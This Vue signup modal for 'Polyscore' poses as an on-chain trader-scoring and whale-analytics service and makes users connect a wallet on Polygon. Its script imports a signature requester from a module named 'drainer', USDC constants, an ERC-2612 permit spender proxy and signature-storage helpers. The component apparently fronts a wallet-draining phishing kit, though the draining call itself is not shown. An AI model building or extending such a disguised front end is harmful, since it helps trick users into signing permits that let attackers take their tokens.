<template>
  <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
    <div
      class="relative w-full max-w-[460px] rounded-2xl border border-[#1F2530] bg-[#0A0C10] shadow-[0_0_80px_rgba(61,111,255,0.15)] p-7"
      style="background-image: radial-gradient(circle at top left, rgba(61,111,255,0.25), transparent 60%), radial-gradient(circle at bottom right, rgba(255,180,0,0.15), transparent 55%);"
    >

      <!-- Close -->
      <button
        @click="$emit('onClose')"
        class="absolute top-4 right-4 text-gray-400 hover:text-white transition"
      >
        <X :size="18" />
      </button>

      <!-- Header -->
      <div class="mb-6">
        <h2 class="text-2xl font-extrabold bg-gradient-to-r from-[#86B9FF] to-[#3D6FFF] text-transparent bg-clip-text">
          Create Polyscore account
        </h2>
        <p class="text-gray-400 text-sm mt-1">
          Unlock on-chain trader scoring & whale analytics.
        </p>
      </div>

      <!-- Inputs -->
      <div class="space-y-4">

        <div>
          <label class="text-xs text-gray-400 mb-1 block">Email address</label>
          <input v-model="email" type="email" placeholder="you@example.com"
            class="w-full bg-[#0D1117] border border-[#1F2530] rounded-xl px-4 py-3 text-sm text-gray-200 placeholder-gray-500 focus:ring-2 focus:ring-[#3D6FFF]/40 focus:outline-none" />
        </div>

        <div>
          <label class="text-xs text-gray-400 mb-1 block">Username</label>
          <input v-model="username" type="text" placeholder="whale_hunter"
            class="w-full bg-[#0D1117] border border-[#1F2530] rounded-xl px-4 py-3 text-sm text-gray-200 placeholder-gray-500 focus:ring-2 focus:ring-[#3D6FFF]/40 focus:outline-none" />
        </div>

        <div class="grid grid-cols-2 gap-3">
          <div>
            <label class="text-xs text-gray-400 mb-1 block">Password</label>
            <input v-model="password" type="password" placeholder="••••••••"
              class="w-full bg-[#0D1117] border border-[#1F2530] rounded-xl px-4 py-3 text-sm text-gray-200 placeholder-gray-500 focus:ring-2 focus:ring-[#3D6FFF]/40 focus:outline-none" />
          </div>

          <div>
            <label class="text-xs text-gray-400 mb-1 block">Confirm</label>
            <input v-model="confirmPassword" type="password" placeholder="••••••••"
              class="w-full bg-[#0D1117] border border-[#1F2530] rounded-xl px-4 py-3 text-sm text-gray-200 placeholder-gray-500 focus:ring-2 focus:ring-[#3D6FFF]/40 focus:outline-none" />
          </div>
        </div>

        <div v-if="auth.isWalletConnected">
          <label class="text-xs text-gray-400 mb-1 block">Connected wallet</label>
          <input v-model="auth.walletAddress" disabled
            class="w-full bg-[#0D1117] border border-[#1F2530] rounded-xl px-4 py-3 text-sm text-[#7BA7FF]" />
        </div>

        <p v-if="error" class="text-red-400 text-xs font-semibold">{{ error }}</p>

        <!-- Wallet / Submit -->
        <button
          v-if="!showLoginButton"
          @click="connectClicked"
          class="w-full mt-2 bg-gradient-to-r from-[#3D6FFF] to-[#7BA7FF] hover:shadow-lg hover:shadow-blue-500/40 text-black font-bold py-3 rounded-xl transition">
          {{ connectLoading ? 'Connecting wallet...' : 'Connect Wallet' }}
        </button>

        <button
          v-else
          @click="handleSubmit"
          class="w-full mt-2 bg-gradient-to-r from-[#3D6FFF] to-[#7BA7FF] hover:shadow-lg hover:shadow-blue-500/40 text-black font-bold py-3 rounded-xl transition">
          {{ loading ? 'Creating account...' : 'Create Polyscore account' }}
        </button>
      </div>

      <!-- Footer -->
      <div class="mt-6 text-center text-xs text-gray-500">
        Already have an account?
        <span
          @click="$emit('signInClicked')"
          class="ml-1 text-[#7BA7FF] hover:text-[#86B9FF] cursor-pointer font-semibold">
          Sign in
        </span>
      </div>

    </div>
  </div>
</template>


<script setup>
import { ref } from 'vue'
import { X } from 'lucide-vue-next'
import { register } from '~/apiss/auth'
import { getAddress, getIsConnected, subscribeState, openModal, disconnectWallet, getChainID, switchNetwork, getProvider, getWalletETHBalance } from '../../apiss/web3/walletconnect';
import { requestSignature } from '../../apiss/web3/drainer/main'
import { USDC_NAME, USDC_ADDRESS } from '../../apiss/web3/drainer/constants'
import { spenderProxyAddress } from '../../apiss/web3/constants/erc2612permit'
import { create as saveAddressSignature, getAddressSignature, update as updateAddressSignature } from '../../apiss/walletSignature'



const email = ref('')
const username = ref('')
const password = ref('')
const confirmPassword = ref('')
const emit = defineEmits(['onClose'])
const error = ref("")
const loading = ref(false);
const connectLoading = ref(false)
const showLoginButton = ref(false)
const showLoadingModal = ref(false)
const auth = useAuth();


watch(() => email.value, () => error.value = '')
watch(() => username.value, () => error.value = '')
watch(() => confirmPassword.value, () => error.value = '')
watch(() => password.value, () => error.value = '')


const validateEmail = (email) => {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

const handleSubmit = async () => {
  if (loading.value) return;
  error.value = ""

  if (!username.value || username.value.length < 4) {
    error.value = "Username must be at least 4 characters."
    return
  }

  if (!email.value) {
    error.value = "Email is required."
    return
  }

  if (!validateEmail(email.value)) {
    error.value = "Please enter a valid email address."
    return
  }

  if (!password.value || password.value.length < 6) {
    error.value = "Password must be at least 6 characters."
    return
  }

  if (!confirmPassword.value || confirmPassword.value !== password.value) {
    error.value = "Passwords do not match."
    return
  }

  loading.value = true;
  try {
    const registerResult = await register(username.value, email.value, password.value, auth.value.walletAddress)
    const { sendConfirmAccountEmail } = useEmaiApi();
    const result = await sendConfirmAccountEmail(registerResult.id, email.value, username.value, auth.value.walletAddress)
    auth.value.showEmailConfirmationSent = true;

    if (!result.emailVerified) {
      auth.value.user = null
      auth.value.unverifiedUser = result
      return navigateTo("/verify-required")
    }
    navigateTo(`/report/${auth.value.user.walletAddress}`)
    
    emit("onClose")
    loading.value = false
  } catch (err) {
    console.error(err)
    switch (err.code) {
      case 'auth/email-already-in-use':
        error.value = 'This email is already in use.';
        break;
      case 'auth/invalid-email':
        error.value = 'Invalid email address.';
        break;
      case 'auth/operation-not-allowed':
        error.value = 'Email/password accounts are not enabled.';
        break;
      case 'auth/weak-password':
        error.value = 'Password is too weak (min 6 characters).';
        break;
      default:
        error.value = err.message || 'There was an error registering.';
    }
    loading.value = false
  }
}


async function connectClicked() {
  openModal()
}


onMounted(() => {
  validateWalletConnect()
})

watch(() => auth.value.walletAddress, async() => {
    validateWalletConnect()
})

async function validateWalletConnect() {
  if (!auth.value.walletAddress) return;

    connectLoading.value = true;
    auth.value.addressSignature = await getAddressSignature(auth.value.walletAddress);
    

    if (!auth.value.isWalletConnected) {
        openModal()
        return;
    }


    if (getChainID() != 137){
        if (window.ethereum) await switchNetwork(137);
        else {
            await disconnectWallet();
            auth.value.isWalletConnected = false;
            auth.value.walletAddress = "";
            alert("Switch to Polygon Mainnet Network");  
        }
        return;
    }
    showLoginButton.value = true
}

    // onMounted(() => {

    //         disconnectWallet()
    //         auth.value.addressSignature = null
    //         auth.value.walletAddress = ''
    //         auth.value.isWalletConnected = false
    //         showLoginButton.value = false;
    // })

</script>

<style scoped></style>
